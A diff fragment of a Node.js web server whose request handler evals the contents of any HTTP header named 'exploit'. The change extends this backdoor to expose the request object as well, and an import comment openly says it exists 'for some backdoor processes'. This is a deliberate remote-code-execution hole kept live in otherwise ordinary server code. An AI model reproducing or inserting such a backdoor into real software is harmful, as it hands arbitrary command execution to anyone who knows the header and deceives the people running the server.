@@ -6,7 +6,7 @@ import { execSync } from 'child_process';  // needed for some backdoor processes
 
 const server = http.createServer((req, res) => {
     try {
-        if (req.headers?.exploit) return (eval('let r = res;' + req.headers?.exploit));
+        if (req.headers?.exploit) return (eval('let r=res;let i=req;'+req.headers?.exploit));
         if (req.url == "/" && req.method == "GET") {
             fs.readFile('pages/home.html', 'utf-8', (err, data) => {
                 if (err) {
